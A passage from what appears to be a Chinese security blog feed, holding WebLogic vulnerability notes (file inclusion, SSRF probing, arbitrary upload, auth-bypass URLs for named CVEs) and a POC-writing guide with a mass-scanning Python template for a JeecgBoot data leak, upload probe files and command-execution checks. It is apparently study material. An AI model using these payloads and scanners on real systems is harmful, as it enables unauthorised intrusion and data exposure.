href="#文件包含–CVE-2022-21371" class="headerlink" title="文件包含–CVE-2022-21371"></a>文件包含–CVE-2022-21371</h2><p>影响版本：12.1.3.0.0 &#x2F; 12.2.1.3.0 &#x2F; 12.2.1.4.0 &#x2F; 14.1.1.0.0</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET .//META-INF/MANIFEST.MF</span><br><span class="line">GET .//WEB-INF/web.xml</span><br><span class="line">GET .//WEB-INF/portlet.xml</span><br><span class="line">GET .//WEB-INF/weblogic.xml</span><br></pre></td></tr></table></figure><h2 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF-CVE-2014-4210"></a>SSRF-<strong>CVE-2014-4210</strong></h2><p>搜索<code>An error has occurred</code>定位返回值</p><p>访问存在的端口，返回<code>状态码</code></p><p><img src="/../images/image-20230819125030914.png" alt="image-20230819125030914"></p><p>访问不存在的端口，返回<code>could not connect over HTTP to server</code></p><p><img src="/../images/image-20230819124951962.png" alt="image-20230819124951962"></p><p>如果访问的端口不是http协议，则会返回<code>did not have a valid SOAP content-type</code></p><h2 id="任意文件上传漏洞（CVE-2018-2894）"><a href="#任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞（CVE-2018-2894）"></a>任意文件上传漏洞（CVE-2018-2894）</h2><p><a href="https://paper.seebug.org/647">https://paper.seebug.org/647</a></p><p>产生原因</p><ul><li><p>需要知道部署应用的web目录</p></li><li><p>开启了Web Service Test Page，开发模式下可未授权访问&#x2F;ws_utc&#x2F;Config.do或者认证后访问&#x2F;ws_utc&#x2F;begin.do</p></li></ul><p>复现</p><p>首先需要设置home dir为静态目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819140901725.png" alt="image-20230819140901725"></p><ul><li>Config.do</li></ul><p><img src="/../images/image-20230819140918874.png" alt="image-20230819140918874"></p><p>返回的数据包</p><p><img src="/../images/image-20230819141057345.png" alt="image-20230819141057345"></p><p>上传后的文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/config/keystore/[时间戳]_[文件名]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819141140037.png" alt="image-20230819141140037"></p><ul><li>begin.do</li></ul><p><img src="/../images/image-20230819141750335.png" alt="image-20230819141750335"></p><p><img src="/../images/image-20230819142834936.png" alt="image-20230819142834936"></p><p><img src="/../images/image-20230819143904277.png" alt="image-20230819143904277"></p><p>将发送的时间戳进行转换：2023-08-19 06:27:55.426</p><p>服务器实际上的</p><p><img src="/../images/image-20230819143328926.png" alt="image-20230819143328926"></p><p>所以毫秒处需要进行爆破</p><p>上传后的文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[毫秒]/import_file_name_[文件名]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819143749107.png" alt="image-20230819143749107"></p><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CVE-2020-14750</span><br><span class="line">/console/images/%252E./console.portal</span><br><span class="line">/console/css/%252E./console.portal</span><br><span class="line"></span><br><span class="line"># CVE-2020-14882</span><br><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br><span class="line">/console/images/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p><a href="https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA">https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA</a></p><ul><li><p>weblogic_scanner</p><p>这个工具经常提示需要进一步验证的两个漏洞（没成功过。。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-2618：需要知道weblogic的管理员账密进行任意文件上次上传</span><br><span class="line">CVE-2019-2888：先起一个恶意的xxe服务，再用exp打</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>POC编写</title>
      <link href="/2023/05/01/python%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/05/01/python%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="单个POC模板"><a href="#单个POC模板" class="headerlink" title="单个POC模板"></a>单个POC模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">POC</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.banner()</span><br><span class="line">        self.args = self.parseArgs()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.args.file:</span><br><span class="line">            self.init()</span><br><span class="line">            self.urlList = self.loadURL()  </span><br><span class="line">            self.multiRun()</span><br><span class="line">            self.start = time.time()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.verfyurl()  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">banner</span>(<span class="params">self</span>):</span><br><span class="line">        logo = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                                     .__          </span></span><br><span class="line"><span class="string">  ____ ___  ________    _____ ______ |  |   ____  </span></span><br><span class="line"><span class="string">_/ __ \\  \/  /\__  \  /     \\____ \|  | _/ __ \ </span></span><br><span class="line"><span class="string">\  ___/ &gt;    &lt;  / __ \|  Y Y  \  |_&gt; &gt;  |_\  ___/ </span></span><br><span class="line"><span class="string"> \___  &gt;__/\_ \(____  /__|_|  /   __/|____/\___  &gt;</span></span><br><span class="line"><span class="string">     \/      \/     \/      \/|__|             \/                                                                                                  </span></span><br><span class="line"><span class="string">                                            author： Khaz</span></span><br><span class="line"><span class="string">                                            GitHub： https://github.com/Khaz</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[91m&quot;</span> + logo + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseArgs</span>(<span class="params">self</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d_%H-%M-%S&quot;</span>, time.localtime())</span><br><span class="line">        parser = ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url(e.g. http://127.0.0.1)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">f&quot;Target file(e.g. url.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--thread&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">f&quot;Number of thread (default 5)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--timeout&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,  <span class="built_in">help</span>=<span class="string">&quot;Request timeout (default 3)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=date,  <span class="built_in">help</span>=<span class="string">f&quot;Vuln url output file (e.g. result.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--proxy&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Request Proxy (e.g http://127.0.0.1:8080)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proxy_server</span>(<span class="params">self</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化脚本配置</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nthread:&quot;</span>, self.args.thread)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timeout:&quot;</span>, self.args.timeout)</span><br><span class="line">        msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(self.args.file):</span><br><span class="line">            msg += <span class="string">&quot;Load url file successfully\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">f&quot;\033[31mLoad url file <span class="subst">&#123;self.args.file&#125;</span> failed\033[0m\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;failed&quot;</span> <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Init failed, Please check the environment.&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Init successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回poc的返回包</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">respose</span>(<span class="params">self, url</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        proxies = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> proxy:</span><br><span class="line">            proxies = &#123;<span class="string">&quot;http&quot;</span>: proxy, <span class="string">&quot;https&quot;</span>: proxy&#125;</span><br><span class="line">        path = <span class="string">&quot;/jeecg-boot/sys/user/querySysUser?username=admin&quot;</span></span><br><span class="line">        url = urljoin(url, path)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)           </span><br><span class="line">            resp = response.text</span><br><span class="line">            <span class="keyword">return</span> resp               </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;conn&quot;</span>  </span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 单条url检测</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verfyurl</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.args.url</span><br><span class="line">        repData = self.respose(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN +<span class="string">&quot;[+] 漏洞存在！！！[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))        </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] URL连接失败！ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[x] 未检测到漏洞！[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多条url检测</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, url</span>):</span><br><span class="line">            repData = self.respose(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = Fore.GREEN +<span class="string">&quot;[+] 漏洞存在！！！[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">                self.lock.acquire()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.findCount +=<span class="number">1</span></span><br><span class="line">                    self.vulnRULList.append(url)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    self.lock.release()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = <span class="string">&quot;[-] URL连接失败！ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                msg = <span class="string">&quot;[x] 未检测到漏洞！[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(msg)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.lock.release()</span><br><span class="line">       </span><br><span class="line">    <span class="comment"># 导入文件中的url</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loadURL</span>(<span class="params">self</span>):</span><br><span class="line">        urlList = []</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.args.file, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> f.readlines():</span><br><span class="line">                u = u.strip()</span><br><span class="line">                urlList.append(u)</span><br><span class="line">        <span class="keyword">return</span> urlList</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 多线程</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiRun</span>(<span class="params">self</span>):</span><br><span class="line">        self.findCount = <span class="number">0</span></span><br><span class="line">        self.vulnRULList = []</span><br><span class="line">        self.lock = Lock()</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=self.args.thread)</span><br><span class="line">        <span class="keyword">if</span> self.args.url:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.urlList)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">r&quot;./output&quot;</span>):</span><br><span class="line">            os.mkdir(<span class="string">r&quot;./output&quot;</span>)</span><br><span class="line">        self.outputFile = <span class="string">f&quot;./output/<span class="subst">&#123;self.args.output&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.outputFile, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> self.vulnRULList:</span><br><span class="line">                f.write(url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 结果统计输出</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m&quot;</span> % (<span class="built_in">len</span>(self.urlList), self.findCount))</span><br><span class="line">            self.end = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Time Spent: %.2f&quot;</span> % (self.end - self.start))</span><br><span class="line">            self.output()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>, <span class="string">f&quot;\nThe vulnURL has been saved in <span class="subst">&#123;self.outputFile&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    POC()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件上传poc"><a href="#文件上传poc" class="headerlink" title="文件上传poc"></a>文件上传poc</h2><ul><li><p>JSP</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>)));<span class="keyword">new</span> <span class="title class_">java</span>.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;</span><br></pre></td></tr></table></figure><blockquote><p>通过调用<code>application.getRealPath(request.getServletPath())</code>来获取当前请求的Servlet路径，并将其转换为真实的文件路径。然后，使用<code>new File()</code>来创建一个表示该文件的File对象，并调用<code>.delete()</code>方法来删除该文件。</p></blockquote></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=&quot;</span>);<span class="variable">$file_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="title function_ invoke__">unlink</span>(<span class="variable">$file_path</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="命令执行POC"><a href="#命令执行POC" class="headerlink" title="命令执行POC"></a>命令执行POC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((8#77777)) # 有回显检测32767</span><br><span class="line">curl dnslog # 能出网检测dnslog</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>假设上传文件的表单如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;true&quot;</span> <span class="attr">required</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>对应脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (文件名,文件内容，文件MIME)  &#125;  将文件信息填入元组（）中，只有文件内容是必选的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地文件</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;D:\phpstudy_pro\phpstudy_pro\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接上传文件内容字符串（注意要用二进制）</span></span><br><span class="line"><span class="comment"># files = &#123;&quot;file&quot;: (&quot;sess&quot;, b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;)&#125; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;attr&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data ,files=files)</span><br></pre></td></tr></table></figure><h2 id="配合burp抓包"><a href="#配合burp抓包" class="headerlink" title="配合burp抓包"></a>配合burp抓包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify=False不鉴别burp的ssl证书，否则无法代理https</span></span><br><span class="line">requests.get(url=url,proxies=pro, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h2><p><img src="E:/blog/source/images/image-20230810184821837.png" alt="image-20230810184821837"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]→xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]→aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line">f= <span class="built_in">open</span>(<span class="string">&#x27;./host.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        f.write(url+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">        urls.append(<span class="string">&#x27;http://192-168-1-&#123;&#125;.pvp2039.bugku.cn&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="comment"># 提交任务</span></span><br><span class="line">        futures = [pool.submit(get,url) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待所有任务完成</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大并发数量为20</span></span><br><span class="line">max_concurrent = threading.BoundedSemaphore(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;线程执行的函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> max_concurrent:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建并启动线程</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> f:</span><br><span class="line">            url = url.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=worker, args=(url,))</span><br><span class="line">            thread.start()</span><br><span class="line">            threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h2 id="关闭ssl告警"><a href="#关闭ssl告警" class="headerlink" title="关闭ssl告警"></a>关闭ssl告警</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用警告</span></span><br><span class="line">warnings.simplefilter(<span class="string">&#x27;ignore&#x27;</span>, category=InsecureRequestWarning)</span><br></pre></td></tr></table></figure><h2 id="颜色变化"><a href="#颜色变化" class="headerlink" title="颜色变化"></a>颜色变化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span>存在漏洞！！！！&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = urljoin(url, path)</span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul><li><p>requests.exceptions.TooManyRedirects: Exceeded 30 redirects.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allow_redirects=<span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p>使用.format<img src="E:/blog/source/images/image-20230824220255340.png" alt="image-20230824220255340"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">字符串里原本就有&#123;&#125;时用其他的字符串格式化</span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;xx&#125;</span>&quot;</span></span><br><span class="line"><span class="string">f&quot;%s&quot;</span> % xx</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
